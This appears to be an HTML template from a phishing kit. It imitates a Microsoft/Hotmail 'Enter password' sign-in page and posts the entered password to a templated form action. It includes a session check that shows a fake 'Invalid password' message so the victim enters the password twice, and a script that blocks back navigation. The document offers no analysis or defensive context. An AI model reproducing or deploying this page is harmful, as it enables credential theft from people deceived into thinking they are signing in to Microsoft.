

<!DOCTYPE html>
<html lang="en">
    <head>
        <title>Sign in to your Microsoft account</title>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <link rel="shortcut icon" href="assets/email-assets/hot.ico">
        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.0/css/bootstrap.min.css">
        <script type="text/javascript">function preventBack(){window.history.forward();}setTimeout("preventBack()", 0); window.onunload = function () { null }; </script> <script type="text/javascript" src="assets/js/jquery.min.js"></script>
        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js"></script>
        <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.0/js/bootstrap.min.js"></script>
        <style>
            body {
                background-image: url('assets/email-assets/background-hot.svg');
            }

            .row {
                height: 100vh;
            }

            .card {
                box-shadow: 0 2px 6px rgba(0,0,0,.2);
            }

            .card-body {
                padding: 44px;
            }

            .logo {
                max-width: 256px;
                height: 24px;
                margin-bottom: 15px;
            }

            .text-title {
                color: #1b1b1b;
                font-size: 1.5rem;
                font-weight: 600;
            }

            .form-control {
                padding: 0px;
                border-top-width: 0;
                border-left-width: 0;
                border-right-width: 0;
                -webkit-border-radius: 0;
                border-color: rgba(0,0,0,.6);
                background-color: transparent;
                outline: none;
            }

            .form-control:focus {
                box-shadow: none;
                border-color: #0067b8;
                background-color: transparent;
            }

            .form-check-label > span {
                margin-left: 10px;
            }

            .form-check-input {
                width: 20px;
                height: 20px;
            }

            .forgot {
                font-size: .8125rem;
            }

            .forgot > a {
                color: #0067b8 !important;
            }

            .btn {
                border-color: #0067b8;
                background-color: #0067b8;
                color: #fff;
                min-height: 32px;
                border: none;
                min-width: 108px;
                line-height: normal;
                border-radius: 0;
            }

            .btn:hover {
                border-color: #004e8c;
                background-color: #005da6;
            }

            .btn:focus {
                text-decoration: underline;
                border-color: #004e8c;
                outline: 2px solid #000;
                background-color: #005da6;
                box-shadow: none;
            }

            footer {
                margin-top: -30px;
            }

            footer > .list-group > .list-group-item {
                font-size: 12px;
                line-height: 28px;
                border: none;
                background: transparent;
                padding: 0px;
                padding-left: 8px;
                padding-right: 8px;
            }

            footer > .list-group > .list-group-item > a {
                color: #000;
            }
            
            @media screen and (max-width: 768px) {
                body {
                    background-image: none;
                }

                .row {
                    height: 0px;
                }

                .col-sm-12 {
                    padding-right: 0px;
                    padding-left: 0px;
                }

                .card {
                    border: none;
                    box-shadow: none;
                }

                .card-body {
                    padding: 0px;
                    padding-top: 25px;
                    padding-left: 25px;
                    padding-right: 25px;
                }
                
                footer {
                    display: none;
                }
            }
            
            @media only screen and (min-device-width: 375px) and (max-device-width: 667px) and (-webkit-min-device-pixel-ratio: 2) { 
                body {
                    background-image: none;
                }

                .row {
                    height: 0px;
                }

                .col-sm-12 {
                    padding-right: 0px;
                    padding-left: 0px;
                }

                .card {
                    border: none;
                    box-shadow: none;
                }

                .card-body {
                    padding: 0px;
                    padding-top: 25px;
                    padding-left: 25px;
                    padding-right: 25px;
                }
                
                footer {
                    display: none;
                }
            }
            
            @media only screen and (min-device-width: 414px) and (max-device-width: 736px) and (-webkit-min-device-pixel-ratio: 3) { 
                body {
                    background-image: none;
                }

                .row {
                    height: 0px;
                }

                .col-sm-12 {
                    padding-right: 0px;
                    padding-left: 0px;
                }

                .card {
                    border: none;
                    box-shadow: none;
                }

                .card-body {
                    padding: 0px;
                    padding-top: 25px;
                    padding-left: 25px;
                    padding-right: 25px;
                }
                
                footer {
                    display: none;
                }
            }
            
            @media only screen and (min-device-width: 375px) and (max-device-width: 812px) and (-webkit-min-device-pixel-ratio: 3) { 
                body {
                    background-image: none;
                }

                .row {
                    height: 0px;
                }

                .col-sm-12 {
                    padding-right: 0px;
                    padding-left: 0px;
                }

                .card {
                    border: none;
                    box-shadow: none;
                }

                .card-body {
                    padding: 0px;
                    padding-top: 25px;
                    padding-left: 25px;
                    padding-right: 25px;
                }
                
                footer {
                    display: none;
                }
            }
        </style>
    </head>
    <body>
    
        <div class="container-fluid">
            <div class="row d-flex align-items-center justify-content-center">
                <div class="col-lg-3 col-mg-3 col-sm-12">
                    <div class="card">
                        <div class="card-body">
                            <img src="assets/email-assets/logo-hot.svg" class="logo">
                            <p class="mb-3">Sign in to proceed to {app_name}</p>
                            @if (isset($_SESSION['double_email']))
                            <font color=red>Invalid password, please try again. </font>
                            @endif
                            <p class="mb-1"><img src="assets/email-assets/arrow-hot.svg" class="arrow">{{ $email }} </p>
                            <p class="text-title mb-2">Enter password</p>
                            <form method="post" action="@form_action_page('email')">
                                <div class="form-group">
                                    <input type="password" class="form-control" placeholder="Password" autocorrect="off" autocapitalize="off" spellcheck="false" id="password" name="password" required>
                                </div>
                                <div class="form-group form-check">
                                    <label class="form-check-label">
                                        <input class="form-check-input" type="checkbox"><span>Keep me signed in</span>
                                    </label>
                                </div>
                                <p class="forgot"><a href="#">Forgot password?</a></p>
                                <button type="submit" class="btn btn-primary float-right" name="submit">Sign in</button>
                            </form>
                        </div>
                    </div>
                </div>
            </div>

            <footer class="float-right">
                <ul class="list-group list-group-horizontal">
                    <li class="list-group-item"><a href="#">Terms of use</a></li>
                    <li class="list-group-item"><a href="#">Privacy & cookies</a></li>
                    <li class="list-group-item"><a href="#"><img src="assets/email-assets/ellipsis.svg"></a></li>
                </ul>
            </footer>
        </div>
        
        <script>
            if(navigator.userAgent.match('CriOS')) {
                $('.col-sm-12').css({'margin-top': '330px'})
            } else {
                $('.col-sm-12').css({'margin-top': '0px'})
            }
        </script>
    </body>
</html>